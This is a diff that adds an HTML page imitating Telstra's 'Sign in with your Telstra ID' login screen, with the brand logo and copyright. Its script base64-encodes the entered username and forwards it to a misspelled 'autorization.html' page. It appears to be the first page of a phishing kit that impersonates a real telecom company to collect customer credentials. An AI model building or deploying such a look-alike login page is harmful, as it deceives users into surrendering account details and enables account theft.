@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log into Telstra</title>
+    <link rel="stylesheet" href="assets/custom.css">
+</head>
+<body>
+    <div class="wrapper">
+        <div class="container">
+            <nav>
+                <div class="navbar__brand">
+                        <img src="assets/telstra_ico.png" alt="telstraImage" />
+                </div>
+            </nav>
+        </div>
+    </div>
+
+    <div class="login__body">
+        <h3>Sign In</h3>
+        <p class="p-heading spacing">Sign in with your Telstra ID</p>
+
+        <div class="form__body">
+            <form action="#" method="post">
+                <div class="form-group">
+                    <div>
+                        <label>Username</label>
+                    </div>
+                    <input type="text" id="username" required/>
+
+                    <span id="error-msg" style="color:red; font: 400 1rem/1.4 Telstra Akkurat,Helvetica Neue,Helvetica,Arial,sans-serif; font-size: 14px; display: none;
+                    ">Required field. Please enter your username.</span>
+                </div>
+                <a class="form__recover" href="#" style="text-decoration: underline">Recover Username</a>
+                <div class="form__checkbox">
+                    <input type="checkbox" />
+                    <label>Remember Username</label>
+                </div>
+                <button class="btn" type="botton" onclick="handleEvent(event)">Continue</button>
+            </form>
+            <p class="form__or">OR</p>
+
+            <button class="btn-outline">Create a Telstra ID</button>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer__body">
+            <p>Copyright &copy;2022 Telstra </p>
+            <p>Privacy</p>
+            <p>Term of use</p>
+        </div>
+    </footer>
+</body>
+</html>
+
+<!-- ====== SCRIPTING START HERE ===========  -->
+<script>
+    var username = document.querySelector('#username');
+    var error_msg = document.querySelector('#error-msg')
+
+    const handleEvent = (event) => {
+        event.preventDefault();
+        if(!username.value) {
+           // alert('username empty');
+            error_msg.style.display='block';
+            username.classList.add("error-empty");
+        } else {
+            const url = username.value;
+            window.location = 'autorization.html?username='+btoa(url);
+        }
+}
+</script>
+
+<!-- ====== SCRIPTING END HERE ===========  -->
